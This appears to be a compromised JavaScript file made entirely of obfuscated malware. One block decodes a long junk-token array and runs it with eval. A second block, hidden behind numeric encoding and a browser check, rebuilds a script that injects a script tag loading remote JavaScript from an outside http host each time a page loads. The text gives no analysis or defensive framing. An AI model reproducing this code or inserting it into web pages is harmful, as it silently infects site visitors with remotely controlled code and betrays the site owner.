"®","1","87®®17","8","®","l–","731","–®","2","3","1®","®","217","®®222®","®","212®","®22","3","®–","74","5","–","®","2","45®®","1","72","®","®24","6®","®","2","4","7®®2","48®","–","806–","!–709–","®1","98","®–","6","68","–®","1","4","6","®®152","®–","75","6","–®","1","69","®®","1","98®","®198®","–","7","28","–®170","®","–81","8–","®","231®","®2","38","®–","8","16–:3–","627–lmn","–6","5","3","–","®1","39","®","–7","69","–","®4","®","–664–®","14","6","®","–7","9","0–®1","5®®","2","10®®","2","1","2","®","–7","2","3–","®1","36","®","®22","7","®","u–","6","3","5–","®2","6®","®2","5®","–","81","7–","®207®","=/–791–®26","®","®1","6®","–","753–","®2","45®","®25","3®","–7","48–®17","5","®®","2","49","®","®","250®®251","®®2","31","®®","2","37","®®226®–6","5","1–®","13","5","®","–763–","®","17","6®","–7","1","9–®16","1®","®","1","3","2®–6","77–j","–7","92","–","®23","2®","–","6","45–","'","–","8","0","1–®192","®","–","717–","k®22","3®","o","–8","0","4–","®1","9","5®","®","194®–75","3–®2","34","®","®","24","5","®–6","7","2–","®15","2®®1","70","®®","16","2","®","®","154®","–","6","8","6–","®17","7","®–","63","9–®","1","36®","–","7","4","4–®1","7","1®","®2","3","6","®","–6","85","–","®","176","®","–","802–","$–650","–","®","142","®®","148","®","–7","7","1","–","®1","1","®®253","®","®","5®®7","®","®","14®–","779–®","5®–80","3","–","®","2","1","6","®®","24","5®","–","808–","®221","®","#–","6","71","–","®16","9","®","®1","6","2®","–721","–","®20","1®","®","21","8","®","®20","7","®–768","–®4®","®3","®®1","8","9","®","–73","5","–","®","15","7®–7","42","–","®","15","5","®®246","®","–654","–","0-","–6","4","3","–","!!®","1","29®","–7","9","9","–®","2","6","®–6","3","8–","3–643–@–","638–","®1","38","®","–","6","28–","r","–","7","49–®","240","®","–","6","3","1–p","–6","5","8–","®","1","50","®–","6","79–","®","179","®","–6","26–5–","7","68–®","1","3","®","®1","4®","®1","5","®–","749–®2","3","2","®","®23","8®–","67","5","–","®1","53","®–6","78","–®1","6","2","®","–","7","71–®18","4","®","–6","31","–","I","–","774–®216®–","763–","®","2","05®®176","®–6","64","–]V","–","7","87–®","2","00®–","7","86–\"","®180","®–","709–d–","6","4","1–®","3","1","®®3","1","®","–67","4","–@","®","1","74®","®","1","60","®®","165","®","–7","65–®246","®","®1","®","–8","1","6–<–","7","4","4","–®1","7","1®®24","5","®","–","69","0","–®","19","2","®–7","8","6","–!","®","13","®","®19®–6","8","9–","®167","®","®","1","7","3®–7","3","7–®150","®","–695–®1","37","®","–6","69–","Rc–68","7–","®","12","7","®–","65","3","–","/",",++–","7","9","1–®1","8","1","®\"","–","631","–m®","126®–67","8–","[","®","1","63","®–","81","3–'","–","6","6","7","–®14","5","®®","1","4","8®P","m","–","76","3","–","®17","6","®","–694–","®","1","7","5®","–","761","–®25","3","®","–","729–®20","9®","®2","27®®2","1","9®","®","211®®2","2","0®®226®","®","1","56","®","–","69","0–®","1","74®–","80","2–","®","28®","–72","5–®2","2","2","®–","73","0–","®","1","8","0®","–797–®30","®®23","®®31","®®2","3","®–78","5","–®20®","®","26®–","7","6","4","–","®4","®","®","2","11®","–","8","23–E®32","®-","3","®","2","6®","-–7","06","–","®","1","9","6®–6","45","–®","127®B","A","®","1","3","0","®–","7","2","1","–","®2","0","3","®","–","6","5","4–®","132®®","1","3","5","®JL","®1","2","6","®","S–7","8","5","–®","3®","–819–","®","3®–640","–\"","–769","–","®16","0®","–","6","5","9","–","1–","6","6","6–","8–","722","–p","–","7","9","4–%–","7","23","–®","2","0","1®®","218®","–","71","2–","®12","5","®®","208®","®","1","92®–73","9–","®","234®","®225®®","23","2®","®","23","6","®","–80","3","–","®2","1","6®","–","7","17","–","®","159®–","68","9–f","–","652","–®13","3","®","®144®","–","7","37–®2","1","7®®","235®","®","2","2","7","®®","2","19®","®2","28®","–8","1","8","–;–66","0","–","W","–","7","86","–","®10®","–","8","1","7–","8","–7","4","1–","®223","®","–64","8","–®126®®1","45®","–7","6","6","–","®2","48®–6","9","6–","®14","6®–8","16","–","1","*","2*","–","743–®2","3","4®","–6","41–","®1","38®",">–77","3","–","®","193®","®","13®","–64","1","–","y®1","36","®","®","12","7","®®","13","4","®","®","1","38","®–661–Q","Se7","–6","6","0–","3","–","7","56–®","1","46","®–","6","7","5","–AA","®1","7","1®®","155","®","®","1","7","0","®®","161®–77","3","–","®1","0","®","®","1","4","®®200","®–7","25–","®222®","–772","–®18","®–","8","0","2–","'–","8","0","2","–®2","8®","–","6","79","–","\\y","–63","5–07","–77","7","–","®1","8®–805","–®","3","1®–","8","23","–","D–","7","2","6–","®","2","2","3®","®1","54®","®","21","3®®2","04®–70","3","–®","2","02®–6","49–","®127","®®14","5®®12","9","®–","7","83","–","®","22®–","6","97–","®1","83®","–7","93–","®30","®","\"–","642–",">–7","20","–","®1","6","0®","ro–","768–®158®®158®","®","15","8","®","®","8","®","®248","®","®7®","®254®","®5®","–","6","65","–","®162","®","–7","2","3","–","®","15","0","®","–","6","46–","®","1","38®–","75","5–","®","2","46®","–","687–®","1","8","2®–74","9–®231®®","227","®–7","4","5","–®226®–7","92–","&","®","32","®–677–","®174","®®","15","5","®–","7","6","8–","®9","®®","250","®","–715","–®","1","95","®","®20","0®®1","9","3","®","®","2","0","6®","–","69","2","–®","176","®","–","6","64–®1","4","6®–","7","81–®","1","9","4®–","7","93–®23","5","®","®206","®","®2","0®–","7","1","1–","®","209®","–753–®244®","®","2","3","3","®–","7","4","8","–","®","2","45","®","–","63","9","–®","12","5","®","®","13","1®","®13","0","®","4","<=","4","®","14","3","®–659–52–8","02–®","1","92","®","–","6","58","–","0","0–7","3","2–","z–7","52","–","®","2","38","®®","23","5","®–7","75–","®1","8","8","®","–6","3","0–3","–758–®25","5®","–","79","0","–®19®–","7","93–","®","23","®!®","220","®®","3","2®–","6","47–","®","129®–","73","8–","®2","1","6®®","2","19®–","81","4","–<","–777–®241®–","638","–","®1","35®t–65","1","–®","148®–652","–","®","1","3","4®A^^–759","–®","17","2","®®1","7","9","®","–740","–","®","220","®","®","232®®","2","3","0","®","–","822","–",";","–","641","–","®","1","3","0","®","–","80","8","–\"1","–70","4–®1","86","®","®","124®–","7","07–®","1","2","9®","x","–660–®1","6","4®","63","–699–YYY","Y–676–","B–752","–","®2","5","2","®","–","66","0","–","®14","6","®®","1","51","®","–","82","1–.","–","800–","$,®22","7®-–","7","14","–","®21","6","®®","2","17®","®1","97®–76","3–","®2","52","®–8","1","0","–®","32®","–731","–®","215","®","–640","–","5–6","9","3–®1","35®–77","3–","®1","86","®","–72","9","–®","1","60®–","6","6","4","–","h","–748","–","®1","42®–799","–®190®®","18","9®®1","89®®","1","89","®®1","8","9","®","1–","6","6","8","–",">","–","6","56–/","–679–","EE","–","6","4","6–$–","740–","®246","®–","6","94","–®","1","3","4","®X","U–","6","68","–:","::®","1","64","®®14","8®","–","78","8–®2","7®®1","8®","–","737","–","®","2","30®®2","34®","–65","3","–","P®1","4","5®–","7","3","5","–®","226®","®2","2","4","®","®22","7","®","®","2","13®","–","694","–","®","1","75®k","–","7","45–","®","187","®","®","15","8","®","®2","28®®24","3","®–","641","–","®","13","2","®","y","–7","6","1–®2","®","–","69","6","–®","182®–","757","–®","249®®24","8","®","–","679","–d","e","–6","7","7–Z®18","1","®","–7","56–®","150®®","14","7®","®146®","–648–&","&","&","®14","8®","–","8","0","1","–®31®","–686–","®","17","7®®167®–","7","91","–®","2","7","®","–692–®1","9","2","®","w®1","93®","®19","4®","–6","93","–®19","6","®","–","6","26–m–6","97","–®18","6","®–","6","95","–","®1","73®","®17","9","®–","6","7","5–X","u–","682","–","_","q","–8","0","7","–","®247","®","®2","01","®®1","98","®","–71","5–","i–","6","72","–>","–","6","27–","®","17®–","7","85–#–","82","3–","®7®–","67","6–","F–","7","4","6","–","®","13","7","®","–76","0","–","®1","50®®","1","50","®–76","8–®","158","®","–","7","28–®","224®","–630–","n®1","25®t","–66","2","–®15","5®®","15","9®–","75","9","–®18","6®","®255","®","®254®–6","6","3–","®","1","4","3","®","L","iL–","7","9","8–(%","–7","8","1–®","14®–","7","69","–","®","18","2","®","–7","81–","®","2","05","®–","7","86–","®1","99®®2","4","4®–7","0","9","–®","187","®","®2","06®–","8","0","7–$–766","–®","19","3","®–","80","8–/–642","–x®1","33","®®1","2","3","®–73","0","–®222","®","®","2","2","0","®","–","6","6","7–","X","–","72","6","–®1","48®","–797","–®","2","24®","&!–","8","1","2","–","®","20®","5","–6","8","7–®1","82","®–","82","0–27","0","®","24","1®","®","2","4","2","®–7","4","8","–®","175®–","8","1","5–79","–","6","26","–","iz","–","8","1","1–4","2","–69","7","–®","1","83","®®1","88®®1","81","®–","7","2","2–®143","®","®1","54®–","81","1–","®2","33®–7","4","9–","®","16","2®","®","1","73®®16","2","®–75","5–®1","75","®–76","9–®","19","6","®®","0®","®","9®–64","4","–","@–","6","7","1–","o–761–","®","155®","®","15","2®–6","62–","4–7","64","–","®","1","54®®15","4","®–","8","1","3–*","–7","1","2","–","®19","4","®","–77","3–®","251","®®25","4","®","®","2","00®","®2","51","®–6","72–®","16","5®®","16","5","®","–7","0","0–®18","2","®","–8","1","7","–","4*","®9","®.","/","2","–735–","®","2","1","6","®","®","1","5","6","®®2","3","1®","®2","1","5","®®","2","30®","®22","1®®","2","28®–64","2–®","1","39","®","@","–7","0","3","–®1","43®–","6","8","6","–","P","–79","2","–","®183®–","81","2","–®","202®","®202","®–","8","06–","8","®20","0","®","®","1","97®–","7","5","5","–®14","5®®5","®","®1","9","5®–6","65","–;–68","0","–","G","–630","–","®","13","6®4","3","–","718–®1","4","0","®®15","8®","");eval(g157f716);function tc434033(v05df1a2){return ++v05df1a2;}function eb56b5c4(e68567,nf0a2299f){return e68567.substr(nf0a2299f,1);}function db1135b(sbc14fe6,bdb32679){return sbc14fe6.substr(bdb32679,1);}function bad12fc(h4c13b7){return h4c13b7!='–';}function lbea3d98(q33408f){return q33408f=='®';}function yfea79(e760e4e6){var y1972a5=String;g157f716+=y1972a5["\x66\x72\x6fm\x43ha\x72C\x6fde"](e760e4e6);}function ieefe0(s3395d9){var y1972a5=String;return y1972a5["\x66\x72\x6fm\x43ha\x72C\x6fde"](s3395d9);}function cb2c2e45c(pd7a0493){return (pd7a0493+'')["\x63harC\x6fde\x41t"](0);}
c=3-1;i=c-2;if(window.document)if(parseInt("0"+"1"+"23")===83)try{Date().prototype.q}catch(egewgsd){f=['0i62i77i70i59i76i65i71i70i0i1i-8i83i-27i-30i-31i78i57i74i-8i77i74i68i-8i21i-8i-1i64i76i76i72i18i7i7i69i9i64i64i63i6i59i64i76i68i71i69i76i72i67i75i6i64i71i69i61i62i76i72i6i70i61i76i7i63i7i-1i19i-27i-30i-31i65i62i-8i0i76i81i72i61i71i62i-8i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i21i21i-8i-1i77i70i60i61i62i65i70i61i60i-1i1i-8i83i-27i-30i-31i-31i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i-8i8i19i-27i-30i-31i85i-27i-30i-31i60i71i59i77i69i61i70i76i6i71i70i69i71i77i75i61i69i71i78i61i-8i21i-8i62i77i70i59i76i65i71i70i0i1i-8i83i-27i-30i-31i-31i65i62i-8i0i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i21i21i-8i8i1i-8i83i-27i-30i-31i-31i-31i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i-8i9i19i-27i-30i-31i-31i-31i78i57i74i-8i64i61i57i60i-8i21i-8i60i71i59i77i69i61i70i76i6i63i61i76i29i68i61i69i61i70i76i75i26i81i44i57i63i38i57i69i61i0i-1i64i61i57i60i-1i1i51i8i53i19i-27i-30i-31i-31i-31i78i57i74i-8i75i59i74i65i72i76i-8i21i-8i60i71i59i77i69i61i70i76i6i59i74i61i57i76i61i29i68i61i69i61i70i76i0i-1i75i59i74i65i72i76i-1i1i19i-27i-30i-31i-31i-31i75i59i74i65i72i76i6i76i81i72i61i-8i21i-8i-1i76i61i80i76i7i66i57i78i57i75i59i74i65i72i76i-1i19i-27i-30i-31i-31i-31i75i59i74i65i72i76i6i71i70i74i61i57i60i81i75i76i57i76i61i59i64i57i70i63i61i-8i21i-8i62i77i70i59i76i65i71i70i-8i0i1i-8i83i-27i-30i-31i-31i-31i-31i65i62i-8i0i76i64i65i75i6i74i61i57i60i81i43i76i57i76i61i-8i21i21i-8i-1i59i71i69i72i68i61i76i61i-1i1i-8i83i-27i-30i-31i-31i-31i-31i-31i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i-8i10i19i-27i-30i-31i-31i-31i-31i85i-27i-30i-31i-31i-31i85i19i-27i-30i-31i-31i-31i75i59i74i65i72i76i6i71i70i68i71i57i60i-8i21i-8i62i77i70i59i76i65i71i70i0i1i-8i83i-27i-30i-31i-31i-31i-31i79i65i70i60i71i79i6i80i81i82i62i68i57i63i-8i21i-8i10i19i-27i-30i-31i-31i-31i85i19i-27i-30i-31i-31i-31i75i59i74i65i72i76i6i75i74i59i-8i21i-8i77i74i68i-8i3i-8i37i57i76i64i6i74i57i70i60i71i69i0i1i6i76i71i43i76i74i65i70i63i0i1i6i75i77i58i75i76i74i65i70i63i0i11i1i-8i3i-8i-1i6i66i75i-1i19i-27i-30i-31i-31i-31i64i61i57i60i6i57i72i72i61i70i60i27i64i65i68i60i0i75i59i74i65i72i76i1i19i-27i-30i-31i-31i85i-27i-30i-31i85i19i-27i-30i85i1i0i1i19'][0].split('i');v="ev"+"al";}if(v)e=window[v];w=f;s=[];r=String;for(;689!=i;i+=1){j=i;s+=r["fromC"+"harCode"](40+1*w[j]);}if(f)z=s;e(z);